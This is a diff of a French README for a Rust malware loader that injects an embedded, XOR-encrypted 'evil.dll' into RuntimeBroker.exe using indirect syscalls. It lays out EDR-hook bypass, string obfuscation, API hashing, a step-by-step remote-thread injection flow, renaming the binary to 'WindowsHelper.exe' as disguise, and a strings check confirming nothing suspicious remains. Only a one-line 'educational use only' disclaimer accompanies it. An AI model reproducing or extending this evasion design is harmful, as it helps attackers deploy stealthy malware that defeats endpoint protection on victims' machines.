@@ -3,107 +3,82 @@
 ## Compilation
 
 ```bash
-# Prérequis (une seule fois)
+# Prerequis (une seule fois)
 rustup target add x86_64-pc-windows-gnu
 
 # Build
 cargo build --release --target x86_64-pc-windows-gnu
 ```
 
-Binaire généré : `target/x86_64-pc-windows-gnu/release/reflective_dll_loader.exe`
+Binaire genere : `target/x86_64-pc-windows-gnu/release/WindowsHelper.exe`
 
-## Vue d'ensemble
+## Techniques implementees
 
-Loader Rust utilisant des **indirect syscalls** pour injecter une DLL reflective dans un processus cible (RuntimeBroker.exe).
+| Technique | Description |
+|-----------|-------------|
+| Indirect Syscalls | Bypass hooks EDR via jump dans ntdll |
+| DLL Chiffree (XOR) | Payload invisible a l'analyse statique |
+| String Obfuscation | `obf_str!` macro - XOR compile-time |
+| API Hashing | `obf!` macro - DJB2 compile-time |
+| PE Parsing | Trouve l'export ReflectiveLoader |
+| RW -> RX | Pas d'allocation RWX suspecte |
+| Minimum Rights | `0x002A` au lieu de `PROCESS_ALL_ACCESS` |
 
-### Techniques implémentées
-
-- **Indirect Syscalls** : Bypass des hooks EDR en sautant directement dans ntdll après les hooks
-- **PE Parsing** : Parse la DLL pour trouver l'export `ReflectiveLoader`
-- **RVA to File Offset** : Convertit les adresses virtuelles en offsets fichier
-- **Process Injection** : Injection dans un processus existant (RuntimeBroker.exe)
-- **Memory Protection** : RW → RX (pas de RWX suspect)
-- **Minimum Rights** : `0x002A` au lieu de `PROCESS_ALL_ACCESS`
-
-### Flow d'injection
+## Flow d'injection
 
 ```
-1. Parse evil.dll embarquée (include_bytes!)
-2. Trouve l'export ReflectiveLoader (RVA → File Offset)
-3. Énumère les processus → RuntimeBroker.exe
-4. NtOpenProcess (droits minimum)
-5. NtAllocateVirtualMemory (RW)
-6. NtWriteVirtualMemory (copie DLL entière)
-7. NtProtectVirtualMemory (RW → RX)
-8. NtCreateThreadEx (démarre à base + offset_ReflectiveLoader)
-9. NtClose (cleanup)
-   ↓
-Dans RuntimeBroker.exe :
-   ReflectiveLoader() se charge lui-même → DllMain() → Payload
+build.rs: evil.dll --XOR--> evil.dll.enc (compile-time)
+                              |
+main.rs:                      v
+  1. Dechiffre DLL en memoire (runtime)
+  2. Parse PE -> trouve ReflectiveLoader offset
+  3. Enumere processus -> RuntimeBroker.exe
+  4. NtOpenProcess (droits minimum)
+  5. NtAllocateVirtualMemory (RW)
+  6. NtWriteVirtualMemory (copie DLL)
+  7. NtProtectVirtualMemory (RW -> RX)
+  8. NtCreateThreadEx (demarre ReflectiveLoader)
+  9. NtClose (cleanup)
 ```
 
-## Syscalls utilisés
-
-| Syscall | Usage |
-|---------|-------|
-| `NtOpenProcess` | Ouvre le processus cible |
-| `NtAllocateVirtualMemory` | Alloue mémoire RW distante |
-| `NtWriteVirtualMemory` | Copie la DLL |
-| `NtProtectVirtualMemory` | Change protection RW → RX |
-| `NtCreateThreadEx` | Crée thread distant |
-| `NtClose` | Cleanup |
-
-## Pourquoi RuntimeBroker.exe ?
-
-- Toujours présent (2-5 instances)
-- Tourne en contexte USER (pas SYSTEM)
-- Pas surveillé par les EDR (low profile)
-- Si crash → Windows en respawn un autre
-- Pas besoin de droits admin
-
-**Note** : RuntimeBroker tourne en AppContainer/Low Integrity, donc les opérations disque (`CreateFileA`) peuvent échouer. Les opérations UI (`MessageBoxA`) fonctionnent.
-
-## Problème d'alignement (`read_unaligned`)
-
-Les données embarquées via `include_bytes!` ne sont pas garanties d'être alignées quand compilées avec MinGW cross-compilation. Le code utilise `std::ptr::read_unaligned` pour tous les accès aux structures PE afin d'éviter les crashes `misaligned pointer dereference`.
-
-## Structure du projet
+## Structure
 
 ```
 loader_rust/
-├── Cargo.toml          # Dépendances (rust_syscalls, ntapi, winapi)
-├── .cargo/config.toml  # Configuration cross-compilation
+├── build.rs                # Chiffre evil.dll au compile-time
+├── Cargo.toml              # Config + nom executable
 ├── src/
-│   └── main.rs         # Code principal (commenté en détail)
+│   ├── main.rs             # Loader principal
+│   └── syscalls/
+│       ├── mod.rs
+│       ├── obf.rs          # Macros obf! et obf_str!
+│       ├── resolve.rs      # Resolution SSN via PEB
+│       └── syscall.rs      # Stub syscall x64
 └── README.md
 ```
 
 ## Configuration
 
-`.cargo/config.toml` :
+Changer le nom de l'executable dans `Cargo.toml` :
 ```toml
-[target.x86_64-pc-windows-gnu]
-linker = "x86_64-w64-mingw32-gcc"
+[[bin]]
+name = "WindowsHelper"  # -> WindowsHelper.exe
+path = "src/main.rs"
 ```
 
-`Cargo.toml` (optimisations) :
-```toml
-[profile.release]
-opt-level = "z"      # Taille minimale
-lto = true           # Link Time Optimization
-panic = "abort"
-strip = true
-codegen-units = 1
+Changer la cle XOR dans `build.rs` ET `src/main.rs` :
+```rust
+const XOR_KEY: &[u8] = b"VotreCleIci!1234";
 ```
 
-## Ressources
+## Verification
 
-- [rust_syscalls](https://github.com/janoglezcampos/rust_syscalls) - Indirect syscalls pour Rust
-- [ReflectiveLdr](https://github.com/rokups/ReflectiveLdr) - Reflective DLL loader
-- [Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection) - Technique originale
+```bash
+# Aucune string suspecte dans le binaire
+strings WindowsHelper.exe | grep -iE "(Reflective|RuntimeBroker|evil)"
+# -> rien
+```
 
 ## Disclaimer
 
-**USAGE ÉDUCATIF UNIQUEMENT**
-
-Ce projet est destiné à l'apprentissage de la sécurité offensive. Toute utilisation malveillante est strictement interdite.
+Usage educatif uniquement.
